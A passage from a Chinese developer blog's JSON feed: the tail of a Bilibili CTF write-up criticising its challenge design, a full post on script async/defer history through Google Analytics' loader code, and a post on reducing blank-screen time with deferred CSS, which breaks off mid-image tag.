开始刷（你给我翻译翻译，谁家系统的超级管理员 uid 不是小于 10 而是大于 1 亿的？）。在经过了这么多无厘头的题目以后，接下来上来就是五道 Web 盲题：未设防 Redis 题本来可以深入到 Get shell、提权的，结果第八题草草 <code>get flag8</code> 了事；第十题的「文件路径猜解」更是非常无厘头，当做题人构建完能绕过 <code>is_numeric</code> 和 <code>intval</code>  的 Payload 后，还要猜测 <code>url</code> 参数的取值需要包含 <code>flag.txt</code> 才能取到最终的 flag；而且第十题拿到的图片直接 <code>tail</code> 就能拿到 flag，而图片隐写本来是非常经典的 CTF 考法。</p>\n<p>无厘头的题目、加上混乱的活动页面（Vue 和 jQuery 齐飞、Element UI 共 Bootstrap 一色），再联想起 Bilibili 中间件源码泄漏、Anankke 在新年活动上 <a href=\"https://blog.anank.ke/w/pilipili_cheers\">只用两小时就刷出了 11 亿美食值</a>，我们大体上可以猜测的出 Bilibili 内部混乱的管理、松散的组织，和极度不重视信息安全、乃至极度不重视技术的风气。Bilibili 这一次的 CTF 暴露出来的问题，远不止选手用 <code>/blog/end.php</code> 读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 耗尽靶机性能导致题目 404 这么简单了。</p>\n<div class=\"license\"> <div class=\"license-title\">Bilibili 2020「1024 程序员节」CTF Write Up</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-25</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/"},{"title":"从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性","date":"2020-10-13 09:25:00","description":"\n<p>之前我在「<a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">天下武功，唯快不破 —— 我是这样优化博客的</a>」一文中提到「对于大部分浏览器来说，确保 JS 异步加载和执行的做法其实是在操作 DOM 动态插入 <code>&lt;script async&gt;</code>」，但是并没有给出详细原因。这一次我以 Google Analytics 的统计代码为引子，详细讲讲 <code>&lt;script&gt;</code> 的 <code>async</code> 和 <code>defer</code> 属性、以及它们背后的故事。</p>\n<h2>拆开 Google Analytic 的统计代码</h2>\n<p>现在 Google 推出了 Google Tag Manager，通过 <code>window.gtag</code> 可以轻易加载包括 <code>analytics.js</code>、Google AD、Google OAuth 等 Google 插件：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Global site tag (gtag.js) - Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://www.googletagmanager.com/gtag/js?id=UA-122669675-1\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-built_in\">window</span>.dataLayer = <span class=\"hljs-built_in\">window</span>.dataLayer || [];</span><span class=\"javascript\">  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">gtag</span>(<span class=\"hljs-params\"></span>)</span>{dataLayer.push(<span class=\"hljs-built_in\">arguments</span>);}</span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'js'</span>, <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>());</span><span class=\"javascript\"></span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'config'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>在 Google Tag Manager 出现之前，大部分人更熟悉传统的 <code>analytics.js</code> 统计代码：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">i,s,o,g,r,a,m</span>)</span>{i[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>]=r;i[r]=i[r]||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{</span><span class=\"javascript\">(i[r].q=i[r].q||[]).push(<span class=\"hljs-built_in\">arguments</span>)},i[r].l=<span class=\"hljs-number\">1</span>*<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();a=s.createElement(o),</span><span class=\"javascript\">m=s.getElementsByTagName(o)[<span class=\"hljs-number\">0</span>];a.async=<span class=\"hljs-number\">1</span>;a.src=g;m.parentNode.insertBefore(a,m)</span><span class=\"javascript\">})(<span class=\"hljs-built_in\">window</span>,<span class=\"hljs-built_in\">document</span>,<span class=\"hljs-string\">'script'</span>,<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>,<span class=\"hljs-string\">'ga'</span>);</span><span class=\"javascript\"></span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 提供的代码是经过压缩后的版本。不过这段代码很短，完全不使用 debugger 等方法也可以还原出原始的代码，让我们拆拆看吧。</p>\n<p>首先不难看出这是一个 IIFE 函数，变量 <code>i</code>、<code>s</code>、<code>o</code>、<code>g</code> 和 <code>r</code>分别指的是 <code>window</code>、<code>document</code>、<code>'script'</code>、<code>https://www.google-analytics.com/analytics.js</code> 和 <code>'ga'</code>（变量 <code>a</code> 和 <code>m</code> 尚未被赋值）。让我们替换这些变量、把 IIFE 拆开：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>] = <span class=\"hljs-string\">'ga'</span>;<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] = <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] || <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{  <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q = (<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q || []).push(<span class=\"hljs-built_in\">arguments</span>)};<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].l = +<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();<span class=\"hljs-keyword\">var</span> a = <span class=\"hljs-built_in\">document</span>.createElement(<span class=\"hljs-string\">'script'</span>);a.async = <span class=\"hljs-number\">1</span>;a.src = <span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>;<span class=\"hljs-keyword\">var</span> m = <span class=\"hljs-built_in\">document</span>.getElementsByTagName(<span class=\"hljs-string\">'script'</span>)[<span class=\"hljs-number\">0</span>];m.parentNode.insertBefore(a, m);</code></pre>\n<p>这下就清楚多了。抛开 Google Analytics 的队列初始化、函数初始化的操作，<code>analytics.js</code> 本质上是通过 JS 动态创建一个 <code>&lt;script async&gt;</code> 标签、并插入到 DOM 中所有 <code>&lt;script&gt;</code> 标签之前。</p>\n<p><a href=\"https://developers.google.com/analytics/devguides/collection/analyticsjs/\">Google 关于 <code>analytics.js</code> 的文档</a> 是这么介绍的：</p>\n<blockquote>\n<p>While the Google Analytics tag described above ensures the script will be loaded and executed asynchronously on all browsers, it has the disadvantage of not allowing modern browsers to preload the script.</p>\n<p>虽然上述代码保证了脚本在所有浏览器上都会异步地加载和执行，但是它也有一个缺陷、它不能够让浏览器 preload 外部的脚本文件。</p>\n</blockquote>\n<p>Google 在文档中也给出了「现代浏览器」专用的代码，看起来和今天的 Google Tag Manager 载入代码非常接近：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\"><span class=\"hljs-built_in\">window</span>.ga=<span class=\"hljs-built_in\">window</span>.ga||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{(ga.q=ga.q||[]).push(<span class=\"hljs-built_in\">arguments</span>)};ga.l=+<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>;</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 文档也对第二种代码进行了介绍：</p>\n<blockquote>\n<p>The alternative async tag below adds support for preloading, which will provide a small performance boost on modern browsers, but can degrade to synchronous loading and execution on IE 9 and older mobile browsers that do not recognize the <code>async</code> script attribute.</p>\n<p>第二种方法在现代浏览器上会略微提升性能，因为现代浏览器支持 preloading。但是在不认识 <code>async</code> 属性的 IE9 和一些老旧的移动端浏览器上，这种方法会降级为同步加载和执行。</p>\n</blockquote>\n<p>所以，结合上述代码和 Google 文档中的描述，我们不难得出结论：</p>\n<ul>\n<li>第一种做法（由 JS 生成 <code>&lt;script async&gt;</code> 标签、动态插入 DOM 中）可以确保 <code>analytics.js</code> 被异步加载和执行，但是在现代浏览器上由于不能提前发现 <code>analytics.js</code> 、不能 preload。</li>\n<li>第二种做法在 HTML 中直接声明了 <code>&lt;script async&gt;</code>、可以被现代浏览器在 Parse HTML 阶段发现 <code>analytics.js</code> 并 preload。但是对于「并不现代的」浏览器中，这种做法不能保证 <code>analytics.js</code> 被异步加载和执行。</li>\n</ul>\n<p>那么，为什么 Google 要这么说呢？</p>\n<h2>混乱的 defer 和 async 实现</h2>\n<p>绝大部分从事前端开发的程序员应该都非常了解 <code>defer</code> 和 <code>async</code> 以及他们的区别：</p>\n<ul>\n<li>\n<code>async</code> 的加载不会阻碍 DOM 的解析，但是当加载完后就会立即执行，执行时会阻碍 DOM 的解析</li>\n<li>\n<code>defer</code> 的加载也不会阻碍 DOM 的解析，并且会在 DOM 解析完后、<code>DOMContentLoaded</code> 触发之前执行</li>\n</ul>\n<p>鲜少有人知道的是，在 HTML5 之前，异步加载和执行外部脚本有一段混乱而荒唐的历史。</p>\n<p><code>defer</code> 属性的历史可以追溯到 1999 年 12 月 24 日制定的 HTML4.01 规范。在 <a href=\"https://www.w3.org/TR/html401/interact/scripts.html#adef-defer\">规范的第 18.2 节中的 18.2.1「SCRIPT 元素」</a> 中，有对 <code>defer</code> 属性的描述：</p>\n<blockquote>\n<p>When set, this boolean attribute provides a hint to the user agent that the script is not going to generate any document content (e.g., no “document.write” in javascript) and thus, the user agent can continue parsing and rendering.</p>\n<p>该 Boolean Attribute 用于提示 User Agent 这份脚本不会生成 document 内容（如，不使用 <code>document.write</code>），因此 User Agent 在遇到该脚本时不应该暂停解析和渲染 document。</p>\n</blockquote>\n<p>值得注意的是，在 HTML4.01 规范中没有强制浏览器用什么行为面对 <code>defer</code> 属性，各个浏览器的实现导致了千奇百怪的行为，这里仅简单列举几个 Quirk 行为：</p>\n<ul>\n<li>2001 年发布的 IE 6 开始对 <code>defer</code> 属性提供支持，但是直到 11 年后 IE 10 发布之前，IE 都不能保证带有 <code>defer</code> 属性的 <code>&lt;script&gt;</code> 能够按顺序执行：如果第一个 <code>defer</code> 的 <code>&lt;script&gt;</code> 使用 DOM API 修改了 DOM 结构、那么第二个 <code>&lt;script defer&gt;</code> 会在第一个 <code>&lt;script&gt;</code> 执行完毕之前就会开始执行。</li>\n<li>2009 年发布的 Firefox 3.5 开始对 <code>defer</code> 属性提供支持，<a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=688580\">但是带有 <code>defer</code> 的 <code>&lt;script&gt;</code> 可能会在 <code>DOMContentLoaded</code> 之后加载和执行</a>，而且 Firefox 甚至会异步执行带有 <code>defer</code> 属性的内联脚本。这一行为直到五年后在 Firefox 31 中才被修复。</li>\n<li>2010 年的 Chrome 8 开始实现 <code>defer</code> 属性。但如果页面的 MIME Type 为 XHTML（<code>application/xhtml+xml</code>），那么 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=874749\">Chrome 会无视 <code>&lt;script&gt;</code> 的 <code>defer</code> 属性</a>，因为 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=611136\">在 XHTML 中 <code>defer</code> 属性只是一个可选实现</a>。</li>\n</ul>\n<p>终于在 HTML5 中，不仅 <code>defer</code> 应有的行为被正式确定下来，而且还介绍了一个新的属性 <code>async</code>，提供了「真正异步地」加载和执行外部脚本的方式。也正是因为 HTML5 正式发布，下面这张介绍 <code>defer</code> 和 <code>async</code> 区别的图也开始深入人心：</p>\n<blockquote><p>这张出现在绝大部分文章中的图，正是来自 HTML5 规范：<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async\">https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async</a></p></blockquote>\n<p>IE 10、Chrome 8、Firefox 3.6 都对 <code>async</code> 属性提供了支持。相对于 <code>defer</code> 混乱的实现，浏览器对 <code>async</code> 的实现可谓是乖巧了许多：除 Safari 5.0 会无视 <code>async</code> 的取值外（<code>async=false</code> 时仍然会异步地加载和执行该外部脚本。这一 Bug 在 Safari 5.1 即被修复），绝大部分浏览器的实现都很正常。</p>\n<h2>等等，动态插入的 script 标签呢</h2>\n<p>如果你还记得 Google 给出的第一种 <code>analytics.js</code> 的加载方法的话（什么？你不记得了？快回到第一节再看一遍），你会注意到 Google 为了「保证了脚本在所有浏览器上都会异步地加载和执行」，使用了 <code>document.createElement('script')</code> 和 <code>el.parentNode.insertBefore</code> 动态插入 <code>&lt;script&gt;</code> 标签。这就引出了这一节的内容：动态插入的 <code>&lt;script&gt;</code> 应该按照什么顺序加载和执行呢？</p>\n<p>这个问题在 HTML4.01 的规范中完全没有说明，因此 HTML5 发布之前，当时的浏览器也依然采用了自己的实现：</p>\n<ul>\n<li>对于 WebKit、Blink 和 IE，动态插入的脚本将会被默认视为需要被异步加载和执行的脚本。如果要同步执行，需要显式声明 <code>async = false</code>。</li>\n<li>对于 Presto（早期 Opera 使用的自研内核）和 Firefox &lt;= 4，动态插入的脚本会默认同步加载和执行，除非显示声明 <code>async = true</code>。不过从 Firefox 4.0 开始，动态插入的脚本将会异步加载和执行，以和 IE、WebKit 行为保持一致（因此同步执行也一样需要显式声明 <code>async = false</code> ）；当 Opera 15 开始更换为基于 Chormium 开发（当时 Chromium 版本为 28）后，行为也变得和 IE、WebKit 一致。</li>\n</ul>\n<p>在 HTML5 规范中，这一问题终于被一劳永逸的解决了。在「<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#script-processing-model\">HTML Standard - 4.12.1.1 Processing Model</a>」中明确规定了浏览器应该如何处理动态插入的 <code>&lt;script&gt;</code>。对于传统的脚本（非 Module），大致处理流程如下所示：</p>\n<blockquote><p>本图由 Sukka 绘制，按照 CC BY-NC-SA 4.0 协议共享。使用时请遵守许可协议，注明出处、不得被用于商业用途（除非获得书面许可）。</p></blockquote>\n<h2>尾声</h2>\n<p>Google Analytics 在 2013 年开始逐渐用 <code>analytics.js</code> 代替 <code>ga.js</code> 时，市面上同时存在有现代的支持 HTML5 和 <code>async</code> 属性的浏览器、和不支持 <code>async</code> 属性的「前 HTML5 时代的」古董浏览器。如果要保证在所有的浏览器上 Google Analytics 都能被异步地加载和执行，动态地将 <code>&lt;script&gt;</code> 标签插入 DOM 中、并显式声明 <code>async = true</code> 无疑是唯一的方法。随着古董浏览器逐渐退出人们的视线、实现 <code>async</code> 属性的浏览器在全球的份额已经达到了 98.08%，Google 终于开始直接用 <code>&lt;script async&gt;</code> 标签引入 Google Tag Manager。</p>\n<div class=\"license\"> <div class=\"license-title\">从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/script-async-defer/\">https://blog.skk.moe/post/script-async-defer/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-13</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/script-async-defer/"},{"title":"再快一点，再快一点 —— 优化博客白屏时间的实践","date":"2020-10-03 08:40:00","description":"\n<p>两个多月以前，我写了一篇文章 <a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">介绍我是如何优化我的博客的</a>，但是我对于博客的白屏时间仍然不满意。过去一个月我在博客上进行了一系列优化实践，终于成功将博客的白屏时间减少了将近 50%，这篇文章就来记录优化的过程和方案。</p>\n<h2>确定和分析白屏时间</h2>\n<p>First Paint 和 First Contentful Paint 是衡量白屏时间的重要指标。Google Chrome 团队提供了专门的库 <code>web-vitals</code> 用于在浏览器中衡量这些指标。直接在本地开发环境中引入该库：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">\"module\"</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-keyword\">import</span> {getFCP, getLCP, getFID} <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'https://unpkg.com/web-vitals@0.2.4/dist/web-vitals.es5.min.js?module'</span>;</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Contentful Paint</span></span><span class=\"javascript\">  getFCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 Largest Contentful Paint</span></span><span class=\"javascript\">  getLCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Input Delay</span></span><span class=\"javascript\">  getFID(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>访问在本地运行的 Hexo Server 实例（<code>http://localhost:4000</code>），打开任意一篇文章，然后在 Dev Tools 中切换到「Performance」Tab 中限制 Network 和 CPU 性能：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/1.png\" width=\"1276\" height=\"279\" class=\"lazy post-img\"></p>\n<blockquote><p>进行性能测试时，模拟移动端的网络和性能是非常重要的。然而，Firefox 的 Dev Tools 至今很遗憾地没有实现这个功能（许多类似的 Feature Request 在 Bugzilla 已经 stall 数个月了）。这也是为什么我钟情于使用 Chromium Based 的浏览器开发的原因。</p></blockquote>\n<p>刷新页面，Console 中会输出三个数值（单位均为毫秒）：</p>\n<pre><code class=\"hljs plaintext\">FCP 1537.4400000000605LCP 1921.934FID 3.559999997378327</code></pre>\n<p>可以看到，First Contentful Paint 时间在 1.5 秒左右、而 Largest Contentful Paint（最大的可视元素，此时是文章的头图）是 1.9 秒。考虑到这是在本地环境、TTFB 只受模拟的「Fast 3G」限制，不难想象在实际访客体验中白屏时间绝对不止 1.5 秒。</p>\n<h2>分析性能瓶颈</h2>\n<p>肯定了问题的确存在，接下来就需要寻找性能瓶颈了。在「Performance」Tab 中将 CPU 性能修改为「6x slowdown」放大性能瓶颈，然后用「Start profiling and reload page」按钮刷新页面和获取火焰图：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/2.png\" width=\"1386\" height=\"946\" class=\"lazy post-img\"></p>\n<p>其中，Layout 占据的时间（117.43ms）比 Parse HTML（22.48ms）和 Recalculate Style（20.37ms）都要长得多，基本可以认定这就是性能瓶颈了。接下来判断是页面什么元素导致了 Layout 的性能瓶颈。对博客中其它页面进行 Profiling，并将火焰图进行对比：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/3.png\" width=\"860\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>从左往右分别是 「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」、首页、「<a href=\"https://blog.skk.moe/post/hello-world/\">Hello World</a>」页面的火焰图和 Layout 用时。</p></blockquote>\n<p>根据火焰图和三个页面的特征，猜测是文章内容部分导致了 Layout 用时过长。为了加以验证，在 CSS 中使用 <code>display: none</code> 将文章内容直接从 DOM 中离线，然后重新生成火焰图。</p>\n<blockquote><p>在页面渲染时， <code>display: none</code>  的元素会直接从 DOM 中离线、不参加 Style 和 Layout。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/4.png\" width=\"1194\" height=\"946\" class=\"lazy post-img\"></p>\n<p>将文章内容设置 <code>display: none</code> 后，Layout 性能直接提升了三倍，所以可以确认性能瓶颈就是文章内容的 Layout 了。</p>\n<h2>优化白屏时间</h2>\n<p>文章内容的 Layout 时间比较长，而文章内容在加载完之前不会触发 First Paint。所以如果需要缩短白屏时间，就必须缩短文章内容 Layout 的用时。</p>\n<p>Layout 是浏览器计算元素几何信息的过程：元素的大小、在页面中的位置。Layout 性能一般和 DOM 元素数量、布局复杂性、布局模型有关。对于 DOM 元素数量这一点没有什么好的解决方案 —— 文章就这么长、每个段落就是一个 <code>&lt;p&gt;</code> 元素；对于文章内容也没有布局复杂性或布局模型可言。因此这是一条死路。</p>\n<p>直接对着自己的博客动死脑筋是行不通的，我决定先和其他的内容网站的 Layout 性能对比一下：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/5.png\" width=\"960\" height=\"500\" class=\"lazy post-img\"></p>\n<blockquote><p>上图左一为知乎专栏文章「<a href=\"https://zhuanlan.zhihu.com/p/25800461\">PWA 在饿了么的实践经验</a>」的火焰图；左二为 QuQuBlog「<a href=\"https://imququ.com/post/optimize-tls-handshake.html\">TLS 握手优化详解</a>」的火焰图；左三为 dev.to 的「<a href=\"https://dev.to/mustapha/css-grid-illustrated-introduction-52l5\">CSS Grid: illustrated introduction</a>」的火焰图。</p></blockquote>\n<p>和其它内容网站比较发现，当页面包含较长篇幅的内容时，「CPU 6x slowdown」下 Layout 用时大抵在 100ms 到 200ms 左右。我的博客内容页面 Layout 用时在 120ms 属于正常范围、基本没有进一步优化的空间。</p>\n<p>不过，我在看 dev.to 的火焰图时发现了一个很有趣的现象：虽然完整 DOM 的 Layout 用时在 123.70ms、但是却发生在 First Paint 和 First Contentful Paint 之后。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/6.png\" width=\"1090\" height=\"314\" class=\"lazy post-img\"></p>\n<p>结合截图和火焰图可以发现，dev.to 在加载文章页面时，先只渲染 Navbar、触发 First Paint、结束白屏；之后继续 Parse HTML、渲染页面主体内容；最后是 Lazyload 后的文章头图、触发 Largest Contentful Paint。这种思路在 H5、小程序中都是很常见：使用 Placeholder （被称为 AppShell）缩短白屏时间、然后再通过 AJAX 获取数据填充到页面上。但是静态博客和小程序最大的区别就是不需要获取数据、文章内容是直接包含在 HTML 中返回的，所以在博客上实践这样的思路需要做一些改变。</p>\n<p>我的做法则是将 CSS 拆分，将 Navbar 和右下角 Fab 按钮的 CSS 提取出来、内联在 HTML 中、当页面加载时就可以 Style &amp; Layout。同时为页面主题内容添加 <code>display: none</code> 使其在 DOM 中离线，使其不影响 First Paint；页面主体内容的 CSS（包括  <code>display: block</code>） 拆分成独立的 CSS。由于 CSS 是「渲染阻塞（Render Blocking）」的资源，浏览器在 Parse HTML 时如果遇到 CSS 就会开始请求、并在 CSS 下载完成之前不会开始 Style &amp; Layout。因此，需要一个小 trick 实现异步加载 CSS（使 CSS 不再阻塞渲染）：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span> <span class=\"hljs-attr\">media</span>=<span class=\"hljs-string\">\"print\"</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">\"this.media='all';this.onload=null\"</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">noscript</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">noscript</span>&gt;</span></code></pre>\n<p>带有 <code>[media=print]</code> 属性的 CSS 仍然会以低优先级加载，但并不会直接参与 Style &amp; Layout、因此不会阻塞渲染。当 CSS 文件下载后触发 <code>onload</code> 事件、将 <code>media</code> 属性改为 <code>all</code>、使 CSS 在当前页面生效。</p>\n<p>为了使白屏不显得枯燥，我还加了一个「加载中」的闪烁动画，使用 <code>animation-delay</code> 延迟 0.6 秒显示。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/9.png\" width=\"813\" height=\"849\" class=\"lazy post-img\"></p>\n<p>不过使用这种方案需要注意两个问题。一是当页面内容被 <code>display: none</code> 后、页面的高度会小于 viewport、因此浏览器不会展示滚动条；当页面内容被覆盖为 <code>display: block</code> 后、浏览器会重新展示滚动条、导致抖动，因此需要为 <code>&lt;html&gt;</code> 添加 <code>overflow-y: scroll</code>。另一个问题是新的 CSS 生效时会触发新的 Style &amp; Layout、可能会导致已经渲染过的 Navbar 和 Fab 按钮被再次 Layout，造成性能浪费；解决方案是使用「<a href=\"https://drafts.csswg.org/css-contain/\">CSS Containment</a>」草案中引入的 <code>contain</code> 属性，通过在 CSS 中显式声明当前元素及其后代与 DOM 的关系，当浏览器重新计算样式和布局时只会影响有限的 DOM。截至本文写就，Edge（Chromium Based）、Firefox、Chrome 都已经对 <code>contain</code> 属性提供了支持。关于 CSS Containment 的用法，可以参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/contain\">MDN 上对 contain 的说明</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/7.png\" width=\"800\" height=\"368\" class=\"lazy post-img\"></p>\n<p>同时，如果使用异步加载 CSS，那么页面主体内容的显示时机就会受到两个因素制约 —— 除 Style &amp; Layout 外、还有 CSS 的加载。为了尽可能消除 CSS 加载对文章内容显示的影响，我为 CSS 设置了 HTTP/2 Push，这样 CSS 能够和 HTML 同时到达浏览器、但不会马上参与 First Paint 的 Style &amp; Layout。关于 HTTP/2 Push 的更多细节，可以参考我的文章「<a href=\"https://blog.skk.moe/post/http2-server-push/\">静态资源递送优化：HTTP/2 和 Server Push</a>」。</p>\n<p>实践的效果妙不可言：First Paint 之前的 Style &amp; Layout 用时加起来也不超过 50ms、几乎 HTML 一下载完就可以看到 Navbar。当 <code>defer.css</code> 加载完、样式和布局计算完后文章内容即绘制到屏幕上。如果 <code>defer.css</code> 出于某种原因没有及时加载（如 User-Agent 不支持 HTTP/2 Push、<code>defer.css</code> 未能命中缓存），那么「加载中…」就会展示出来，使访客不会认为页面失去响应。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/8.png\" width=\"1106\" height=\"945\" class=\"lazy 